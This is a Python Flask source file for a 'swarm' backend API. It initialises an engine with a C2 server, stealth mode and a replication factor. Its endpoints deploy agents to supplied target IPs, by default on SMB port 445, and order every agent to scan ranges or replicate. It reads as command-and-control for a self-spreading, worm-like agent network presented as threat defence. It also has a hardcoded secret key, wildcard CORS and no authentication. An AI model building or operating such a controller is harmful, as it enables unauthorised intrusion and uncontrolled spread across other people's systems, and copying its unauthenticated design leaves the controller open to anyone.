"""
SERVERROOT.NET - SWARM BACKEND API

REST API service for web portal communication.
Provides real-time swarm status, control, and monitoring.

ENDPOINTS:
- GET /api/swarm/status - Get swarm status
- POST /api/swarm/deploy - Deploy agents
- POST /api/swarm/scale - Scale swarm
- GET /api/swarm/agents - List all agents
- GET /api/swarm/intelligence - Get threat intelligence
- POST /api/swarm/commands - Issue commands
- GET /api/swarm/stats - Get statistics
- WebSocket /api/swarm/streaming - Real-time updates
"""

from flask import Flask, jsonify, request
from flask_socketio import SocketIO, emit
from flask_cors import CORS
import threading
import time
import json
from datetime import datetime
from typing import Dict, List
import uuid

# Import swarm components
from agent.autonomous_swarm_agent import AutonomousSwarmEngine
from swarm.swarm_orchestrator import SwarmOrchestrator

app = Flask(__name__)
app.config['SECRET_KEY'] = 'serverroot-swarm-secret-key'
CORS(app)
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

# Global swarm instances
swarm_engine: AutonomousSwarmEngine = None
swarm_orchestrator: SwarmOrchestrator = None

# Real-time streaming
streaming_active = False
streaming_thread = None


@app.route('/api/health', methods=['GET'])
def health_check():
    """Health check endpoint"""
    return jsonify({
        "status": "healthy",
        "service": "ServerRoot.net Swarm API",
        "timestamp": datetime.now().isoformat()
    })


@app.route('/api/swarm/init', methods=['POST'])
def initialize_swarm():
    """Initialize swarm with given parameters"""
    global swarm_engine, swarm_orchestrator
    
    config = request.json or {}
    
    # Create swarm engine
    swarm_engine = AutonomousSwarmEngine(
        c2_server=config.get("c2_server", "localhost"),
        c2_port=config.get("c2_port", 8443),
        enable_stealth=config.get("enable_stealth", True),
        replication_factor=config.get("replication_factor", 20),
        max_generations=config.get("max_generations", 4),
        auto_start=True
    )
    
    # Create orchestrator
    swarm_orchestrator = SwarmOrchestrator(swarm_engine)
    
    # Start orchestrator in background
    orchestrator_thread = threading.Thread(
        target=lambda: swarm_engine.loop.run_until_complete(swarm_orchestrator.start()),
        daemon=True
    )
    orchestrator_thread.start()
    
    return jsonify({
        "success": True,
        "message": "Swarm initialized",
        "coordinator_id": swarm_engine.coordinator_id,
        "timestamp": datetime.now().isoformat()
    })


@app.route('/api/swarm/status', methods=['GET'])
def get_swarm_status():
    """Get current swarm status"""
    if not swarm_engine:
        return jsonify({
            "success": False,
            "error": "Swarm not initialized"
        }), 400
    
    status = swarm_engine.get_swarm_status()
    
    # Add orchestrator status if available
    if swarm_orchestrator:
        status["orchestrator"] = swarm_orchestrator.get_orchestrator_status()
    
    return jsonify({
        "success": True,
        "data": status,
        "timestamp": datetime.now().isoformat()
    })


@app.route('/api/swarm/aggregated-stats', methods=['GET'])
def get_aggregated_stats():
    """Get aggregated statistics"""
    if not swarm_engine:
        return jsonify({
            "success": False,
            "error": "Swarm not initialized"
        }), 400
    
    swarm_status = swarm_engine.get_swarm_status()
    
    stats = {
        "total_agents": swarm_status["total_agents"],
        "active_agents": swarm_status["active_agents"],
        "total_scanned": swarm_status["targets_scanned"],
        "vulnerabilities_found": swarm_status["vulnerabilities_found"],
        "threats_neutralized": swarm_status["threats_neutralized"],
        "agents_spawned": swarm_status["agents_spawned"],
        "generations": swarm_status["generations"],
        "swarm_uptime": _calculate_uptime(swarm_status.get("swarm_start_time")),
        "replication_rate": _calculate_replication_rate(swarm_status),
        "efficiency_score": _calculate_efficiency(swarm_status)
    }
    
    return jsonify({
        "success": True,
        "data": stats,
        "timestamp": datetime.now().isoformat()
    })


@app.route('/api/swarm/agents', methods=['GET'])
def get_agents():
    """Get list of all agents"""
    if not swarm_engine:
        return jsonify({
            "success": False,
            "error": "Swarm not initialized"
        }), 400
    
    swarm_status = swarm_engine.get_swarm_status()
    
    # Add filters
    filters = request.args.to_dict()
    filtered_agents = swarm_status["agents"]
    
    if filters.get("active"):
        active_filter = filters["active"].lower() == "true"
        filtered_agents = [a for a in filtered_agents if a["active"] == active_filter]
    
    if filters.get("generation"):
        gen_filter = int(filters["generation"])
        filtered_agents = [a for a in filtered_agents if a["generation"] == gen_filter]
    
    if filters.get("state"):
        state_filter = filters["state"]
        filtered_agents = [a for a in filtered_agents if a["state"] == state_filter]
    
    # Pagination
    page = int(filters.get("page", 1))
    per_page = int(filters.get("per_page", 50))
    
    start = (page - 1) * per_page
    end = start + per_page
    paginated_agents = filtered_agents[start:end]
    
    return jsonify({
        "success": True,
        "data": {
            "agents": paginated_agents,
            "total": len(filtered_agents),
            "page": page,
            "per_page": per_page,
            "total_pages": (len(filtered_agents) + per_page - 1) // per_page
        },
        "timestamp": datetime.now().isoformat()
    })


@app.route('/api/swarm/deploy', methods=['POST'])
def deploy_agents():
    """Deploy new agents to targets"""
    if not swarm_engine:
        return jsonify({
            "success": False,
            "error": "Swarm not initialized"
        }), 400
    
    targets = request.json.get("targets", [])
    
    if not targets:
        return jsonify({
            "success": False,
            "error": "No targets provided"
        }), 400
    
    deployed_agents = []
    
    for target in targets:
        try:
            agent_id = swarm_engine.deploy_agent(
                target_ip=target.get("ip"),
                target_port=target.get("port", 445)
            )
            deployed_agents.append({
                "target": target,
                "agent_id": agent_id,
                "status": "deployed"
            })
        except Exception as e:
            deployed_agents.append({
                "target": target,
                "agent_id": None,
                "status": "failed",
                "error": str(e)
            })
    
    return jsonify({
        "success": True,
        "data": {
            "deployed": deployed_agents,
            "total": len(deployed_agents),
            "successful": len([a for a in deployed_agents if a["status"] == "deployed"])
        },
        "timestamp": datetime.now().isoformat()
    })


@app.route('/api/swarm/scale', methods=['POST'])
def scale_swarm():
    """Scale swarm replication"""
    if not swarm_engine:
        return jsonify({
            "success": False,
            "error": "Swarm not initialized"
        }), 400
    
    replication_factor = request.json.get("replication_factor", 20)
    
    if swarm_orchestrator:
        swarm_orchestrator.scale_swarm(replication_factor)
    
    swarm_engine.replication_factor = replication_factor
    
    return jsonify({
        "success": True,
        "data": {
            "replication_factor": replication_factor,
            "message": f"Swarm replication factor set to {replication_factor}x"
        },
        "timestamp": datetime.now().isoformat()
    })


@app.route('/api/swarm/commands', methods=['POST'])
def issue_command():
    """Issue command to swarm (global commands)"""
    if not swarm_engine:
        return jsonify({
            "success": False,
            "error": "Swarm not initialized"
        }), 400
    
    command = request.json.get("command", {})
    command_type = command.get("type")
    
    if command_type == "emergency_stop":
        swarm_engine.stop_swarm()
        if swarm_orchestrator:
            swarm_orchestrator.stop()
    
    elif command_type == "pause":
        # Pause swarm operations
        swarm_engine.running = False
    
    elif command_type == "resume":
        # Resume swarm operations
        swarm_engine.running = True
    
    elif command_type == "deploy_swarm":
        # Deploy swarm to targets
        if swarm_orchestrator:
            swarm_orchestrator.deploy_swarm(command.get("targets", []))
    
    elif command_type == "scan_range":
        # Command all agents to scan specific range
        targets = command.get("targets", [])
        cmd = {"type": "scan_range", "targets": targets}
        count = swarm_engine.issue_swarm_command(cmd)
        return jsonify({
            "success": True,
            "data": {
                "command": command_type,
                "executed": True,
                "agents_affected": count
            },
            "timestamp": datetime.now().isoformat()
        })
    
    elif command_type == "stop_scanning":
        # Stop all agents from scanning
        cmd = {"type": "stop_scanning"}
        count = swarm_engine.issue_swarm_command(cmd)
        return jsonify({
            "success": True,
            "data": {
                "command": command_type,
                "executed": True,
                "agents_affected": count
            },
            "timestamp": datetime.now().isoformat()
        })
    
    elif command_type == "start_scanning":
        # Start all agents scanning
        cmd = {"type": "start_scanning"}
        count = swarm_engine.issue_swarm_command(cmd)
        return jsonify({
            "success": True,
            "data": {
                "command": command_type,
                "executed": True,
                "agents_affected": count
            },
            "timestamp": datetime.now().isoformat()
        })
    
    elif command_type == "replicate_now":
        # Force all agents to replicate now
        cmd = {"type": "replicate_now"}
        count = swarm_engine.issue_swarm_command(cmd)
        return jsonify({
            "success": True,
            "data": {
                "command": command_type,
                "executed": True,
                "agents_affected": count
            },
            "timestamp": datetime.now().isoformat()
        })
    
    else:
        return jsonify({
            "success": False,
            "error": f"Unknown command type: {command_type}"
        }), 400
    
    return jsonify({
        "success": True,
        "data": {
            "command": command_type,
            "executed": True
        },
        "timestamp": datetime.now().isoformat()
    })



@app.route('/api/swarm/agents/<agent_id>/commands', methods=['POST'])
def issue_agent_command(agent_id):
    """Issue command to specific agent"""
    if not swarm_engine:
        return jsonify({
            "success": False,
            "error": "Swarm not initialized"
        }), 400
    
    command = request.json.get("command", {})
    
    success = swarm_engine.issue_command(agent_id, command)
    
    if success:
        return jsonify({
            "success": True,
            "data": {
                "agent_id": agent_id,
                "command": command.get("type"),
                "executed": True
            },
            "timestamp": datetime.now().isoformat()
        })
    else:
        return jsonify({
            "success": False,
            "error": f"Failed to issue command to agent {agent_id}"
        }), 400

@app.route('/api/swarm/intelligence', methods=['GET'])
def get_intelligence():
    """Get threat intelligence"""
    if not swarm_orchestrator:
        return jsonify({
            "success": False,
            "error": "Orchestrator not available"
        }), 400
    
    intelligence_data = {
        "threat_database": swarm_orchestrator.intelligence.threat_database,
        "network_topology": swarm_orchestrator.intelligence.get_network_graph(),
        "agent_performance": swarm_orchestrator.intelligence.agent_performance
    }
    
    return jsonify({
        "success": True,
        "data": intelligence_data,
        "timestamp": datetime.now().isoformat()
    })


@app.route('/api/swarm/stats/detailed', methods=['GET'])
def get_detailed_stats():
    """Get detailed statistics"""
    if not swarm_engine:
        return jsonify({
            "success": False,
            "error": "Swarm not initialized"
        }), 400
    
    swarm_status = swarm_engine.get_swarm_status()
    
    # Calculate detailed statistics
    detailed_stats = {
        "generational_distribution": swarm_status["generations"],
        "agent_states": _count_agent_states(swarm_status["agents"]),
        "performance_metrics": _calculate_performance_metrics(swarm_status["agents"]),
        "network_coverage": _calculate_network_coverage(swarm_status["agents"]),
        "threat_landscape": _analyze_threat_landscape(swarm_status),
        "replication_progress": _calculate_replication_progress(swarm_status),
        "swarm_health": _calculate_swarm_health(swarm_status)
    }
    
    return jsonify({
        "success": True,
        "data": detailed_stats,
        "timestamp": datetime.now().isoformat()
    })


# WebSocket events

@socketio.on('connect')
def handle_connect():
    """Handle client connection"""
    print(f"Client connected: {request.sid}")
    emit('connected', {
        "message": "Connected to ServerRoot.net Swarm API",
        "timestamp": datetime.now().isoformat()
    })


@socketio.on('disconnect')
def handle_disconnect():
    """Handle client disconnection"""
    print(f"Client disconnected: {request.sid}")


@socketio.on('subscribe_swarm_updates')
def handle_subscribe(data):
    """Subscribe to swarm updates"""
    global streaming_active
    
    if not streaming_active:
        streaming_active = True
        start_streaming()
    
    emit('subscribed', {
        "event": "swarm_updates",
        "message": "Subscribed to real-time swarm updates"
    })


@socketio.on('unsubscribe_swarm_updates')
def handle_unsubscribe(data):
    """Unsubscribe from swarm updates"""
    global streaming_active
    
    streaming_active = False
    
    emit('unsubscribed', {
        "event": "swarm_updates",
        "message": "Unsubscribed from swarm updates"
    })


# Streaming functions

def start_streaming():
    """Start real-time swarm updates streaming"""
    global streaming_thread
    
    if streaming_thread is None or not streaming_thread.is_alive():
        streaming_thread = threading.Thread(
            target=_stream_swarm_updates,
            daemon=True
        )
        streaming_thread.start()


def _stream_swarm_updates():
    """Stream swarm updates to connected clients"""
    global streaming_active
    
    while streaming_active:
        try:
            if swarm_engine:
                swarm_status = swarm_engine.get_swarm_status()
                
                # Emit updates to all connected clients
                socketio.emit('swarm_update', {
                    "status": swarm_status,
                    "timestamp": datetime.now().isoformat()
                })
            
            time.sleep(1)  # Update every second
        
        except Exception as e:
            print(f"Streaming error: {e}")
            time.sleep(1)


# Helper functions

def _calculate_uptime(start_time_str: str) -> str:
    """Calculate swarm uptime"""
    if not start_time_str:
        return "0:00:00"
    
    start_time = datetime.fromisoformat(start_time_str)
    uptime = datetime.now() - start_time
    
    hours, remainder = divmod(int(uptime.total_seconds()), 3600)
    minutes, seconds = divmod(remainder, 60)
    
    return f"{hours:02d}:{minutes:02d}:{seconds:02d}"


def _calculate_replication_rate(swarm_status: Dict) -> float:
    """Calculate replication rate (agents per minute)"""
    spawned = swarm_status["agents_spawned"]
    
    if not swarm_status["swarm_start_time"]:
        return 0.0
    
    start_time = datetime.fromisoformat(swarm_status["swarm_start_time"])
    elapsed = (datetime.now() - start_time).total_seconds() / 60  # minutes
    
    if elapsed == 0:
        return 0.0
    
    return round(spawned / elapsed, 2)


def _calculate_efficiency(swarm_status: Dict) -> float:
    """Calculate swarm efficiency score (0-100)"""
    agents = swarm_status["agents"]
    
    if not agents:
        return 0.0
    
    # Factors: active agents, scanning agents, threats neutralized
    total_agents = len(agents)
    active_agents = sum(1 for a in agents if a["active"])
    scanning_agents = sum(1 for a in agents if a["state"] == "scanning")
    threats_neutralized = swarm_status["threats_neutralized"]
    
    if total_agents == 0:
        return 0.0
    
    # Calculate score
    activity_score = (active_agents / total_agents) * 40
    scanning_score = (scanning_agents / total_agents) * 30
    defense_score = min(threats_neutralized * 0.5, 30)  # Cap at 30 points
    
    total_score = activity_score + scanning_score + defense_score
    
    return round(total_score, 2)


def _count_agent_states(agents: List[Dict]) -> Dict[str, int]:
    """Count agents by state"""
    states = {}
    
    for agent in agents:
        state = agent["state"]
        states[state] = states.get(state, 0) + 1
    
    return states


def _calculate_performance_metrics(agents: List[Dict]) -> Dict:
    """Calculate performance metrics"""
    if not agents:
        return {}
    
    total_scanned = sum(a["scanned"] for a in agents)
    total_vulnerabilities = sum(a["vulnerabilities"] for a in agents)
    total_neutralized = sum(a["neutralized"] for a in agents)
    total_spawned = sum(a["spawned"] for a in agents)
    
    return {
        "avg_scanned_per_agent": round(total_scanned / len(agents), 2),
        "avg_vulnerabilities_per_agent": round(total_vulnerabilities / len(agents), 2),
        "avg_neutralized_per_agent": round(total_neutralized / len(agents), 2),
        "avg_spawned_per_agent": round(total_spawned / len(agents), 2),
        "top_performer": max(agents, key=lambda a: a["neutralized"]) if agents else None,
        "most_active": max(agents, key=lambda a: a["scanned"]) if agents else None
    }


def _calculate_network_coverage(agents: List[Dict]) -> Dict:
    """Calculate network coverage"""
    unique_ips = set(a["ip"] for a in agents if a["ip"])
    generations = set(a["generation"] for a in agents)
    
    return {
        "unique_targets": len(unique_ips),
        "generational_depth": max(generations) if generations else 0,
        "coverage_percentage": min(len(unique_ips) * 2, 100)  # Estimate
    }


def _analyze_threat_landscape(swarm_status: Dict) -> Dict:
    """Analyze threat landscape"""
    return {
        "total_threats": swarm_status["threats_neutralized"],
        "threat_rate": round(swarm_status["threats_neutralized"] / max(swarm_status["active_agents"], 1), 2),
        "severity_distribution": {
            "critical": swarm_status["vulnerabilities_found"] // 3,
            "high": swarm_status["vulnerabilities_found"] // 3,
            "medium": swarm_status["vulnerabilities_found"] // 3
        }
    }


def _calculate_replication_progress(swarm_status: Dict) -> Dict:
    """Calculate replication progress"""
    generations = swarm_status["generations"]
    
    # Calculate growth trajectory
    generation_counts = [generations.get(g, 0) for g in sorted(generations.keys())]
    
    return {
        "current_generation": max(generations.keys()) if generations else 0,
        "generation_distribution": generations,
        "growth_rate": round(len(generation_counts) / max(len(generation_counts), 1), 2),
        "projected_size": sum(generation_counts) * 2 if generation_counts else 0
    }


def _calculate_swarm_health(swarm_status: Dict) -> Dict:
    """Calculate overall swarm health"""
    agents = swarm_status["agents"]
    
    active_count = sum(1 for a in agents if a["active"])
    health_percentage = (active_count / len(agents) * 100) if agents else 0
    
    health_status = "excellent" if health_percentage >= 90 else \
                    "good" if health_percentage >= 70 else \
                    "fair" if health_percentage >= 50 else "poor"
    
    return {
        "health_percentage": round(health_percentage, 2),
        "health_status": health_status,
        "active_agents": active_count,
        "inactive_agents": len(agents) - active_count
    }


# Main entry point

if __name__ == '__main__':
    print("\n" + "="*80)
    print("SERVERROOT.NET - SWARM BACKEND API")
    print("="*80)
    print("\nStarting API server...")
    print("REST API: http://localhost:5000")
    print("WebSocket: ws://localhost:5000")
    print("="*80 + "\n")
    
    # Start Flask-SocketIO server
    socketio.run(app, host='0.0.0.0', port=5000, debug=False)